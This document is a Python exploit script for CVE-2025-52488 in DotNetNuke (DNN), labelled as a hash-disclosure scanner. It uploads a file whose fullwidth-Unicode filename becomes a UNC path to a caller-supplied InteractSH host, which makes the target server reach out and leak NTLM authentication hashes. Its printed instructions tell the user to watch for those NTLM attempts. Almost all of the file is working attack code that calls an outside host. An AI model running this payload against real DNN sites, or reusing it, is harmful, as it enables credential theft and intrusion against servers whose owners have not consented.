import requests
import random
import string
import urllib.parse
from urllib.parse import urlparse
import urllib3
import time
import sys

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DNNHashDisclosureScanner:
    def __init__(self, target_url, interactsh_url):
        self.target_url = target_url
        self.interactsh_url = interactsh_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': '*/*'
        })
        
    def generate_payload(self):
        """Generate the malicious Unicode payload"""
        base_payload = "%EF%BC%BC%EF%BC%BC" + self.interactsh_url + "%EF%BC%BC%EF%BC%BCc$%EF%BC%BC%EF%BC%BCan.jpg"
        # URL decode and replace dots with fullwidth full stop
        decoded = urllib.parse.unquote(base_payload)
        modified = decoded.replace('.', '\uFF0E')  # Fullwidth full stop
        return modified
    
    def generate_random_string(self, length=10):
        """Generate random string for file content"""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def check_vulnerability(self):
        """Check if target is vulnerable via InteractSH callback"""
        try:
            print(f"[*] Targeting: {self.target_url}")
            print(f"[*] Using InteractSH server: {self.interactsh_url}")
            
            # Generate payload
            payload_filename = self.generate_payload()
            
            # Prepare request
            upload_url = f"{self.target_url.rstrip('/')}/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx"
            params = {
                "PortalID": "0",
                "storageFolderID": "1",
                "overrideFiles": "false"
            }
            
            boundary = "----WebKitFormBoundary" + self.generate_random_string(12)
            
            headers = {
                "Host": urlparse(self.target_url).netloc,
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            }
            
            # Create multipart form data
            file_content = self.generate_random_string(32)
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="{payload_filename}"\r\n'
                f"Content-Type: image/jpeg\r\n\r\n"
                f"{file_content}\r\n"
                f"--{boundary}--\r\n"
            )
            
            # Send payload
            print("[*] Sending exploit payload...")
            response = self.session.post(
                upload_url,
                params=params,
                headers=headers,
                data=body,
                timeout=20,
                verify=False
            )
            
            print("\n[+] Exploit Results:")
            print(f"  Payload Status: Delivered (HTTP {response.status_code})")
            print(f"  InteractSH URL: {self.interactsh_url}")
            
            print("\n[!] Important Next Steps:")
            print("1. Monitor your InteractSH dashboard for incoming connections")
            print("2. Look for NTLM authentication attempts")
            print("3. If you see connections, the target is vulnerable")
            print("\nNote: It may take 2-5 minutes for callbacks to appear")
            
            return {
                'status': 'payload_delivered',
                'http_status': response.status_code,
                'interactsh': self.interactsh_url
            }
            
        except requests.exceptions.Timeout:
            print("[-] Error: Request timed out (target might be unreachable)")
            return {'error': 'timeout'}
        except Exception as e:
            print(f"[-] Error: {str(e)}")
            return {'error': str(e)}

def main():
    print("DNN (DotNetNuke) NTLM Hash Disclosure Scanner - CVE-2025-52488")
    print("(InteractSH Verification Version)")
    print("--------------------------------------------------------------")
    
    if len(sys.argv) < 3:
        print("Usage: python3 dnn_exploit.py <target_url> <interactsh_url>")
        print("Example: python3 dnn_exploit.py https://vuln-site.com abc123.oastify.com")
        sys.exit(1)
        
    target = sys.argv[1]
    interactsh = sys.argv[2]
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    scanner = DNNHashDisclosureScanner(target, interactsh)
    scanner.check_vulnerability()

if __name__ == "__main__":
    main()
